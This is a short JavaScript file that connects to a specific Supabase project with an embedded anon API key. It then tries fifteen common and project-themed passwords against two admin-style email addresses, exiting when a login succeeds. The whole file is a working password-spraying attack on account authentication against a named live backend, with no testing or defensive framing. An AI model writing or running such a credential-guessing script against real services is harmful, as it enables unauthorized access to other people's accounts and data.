import { createClient } from '@supabase/supabase-js'

const url = 'https://erinyjxrfectuepshstg.supabase.co'
const key = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVyaW55anhyZmVjdHVlcHNoc3RnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQ0Mzg5MzYsImV4cCI6MjEwMDAxNDkzNn0.sg4HbUxK_ac9BM5K_yh7bgy6W25f7W8e4CVa1MjIVKc'
const supabase = createClient(url, key)

const emails = ['accounts@admin.com', 'ceo@admin.com']
const passwords = ['Password123!', 'Admin123!', 'P@ssw0rd!', 'Password1!', 'Admin@123', 'Welcome123!', 'Supabase123!', 'Qwerty123!', 'Abcd1234!', 'Test123!', 'Password123', 'Admin123', 'Welcome2024!', 'Carems2024!', 'Carems123!']

for (const email of emails) {
  for (const password of passwords) {
    const { data, error } = await supabase.auth.signInWithPassword({ email, password })
    if (!error && data.session) {
      console.log(JSON.stringify({ email, password, success: true }))
      process.exit(0)
    }
  }
}

console.log(JSON.stringify({ success: false }))
